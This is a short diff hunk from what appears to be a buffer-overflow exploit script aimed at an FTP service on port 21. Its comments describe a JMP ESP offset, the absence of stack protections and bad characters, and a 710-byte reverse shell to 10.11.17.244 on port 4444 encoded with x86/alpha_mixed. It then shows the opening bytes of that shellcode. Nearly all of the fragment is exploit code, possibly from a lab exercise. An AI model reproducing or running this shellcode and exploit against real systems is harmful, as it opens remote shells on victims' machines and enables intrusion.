@@ -15,7 +15,7 @@ port= 21
 #Offset is JMP ESP instruction in the actual program
 #No stack protections in .dll's or program
 #No bad characters discovered
-#rev shell to 10.11.17.244 on port 4444/ encoded with x86/alpha_mixed
+#710 byte rev shell to 10.11.17.244 on port 4444/ encoded with x86/alpha_mixed
 shellcode=("\x89\xe2\xdb\xcd\xd9\x72\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
 "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
 "\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
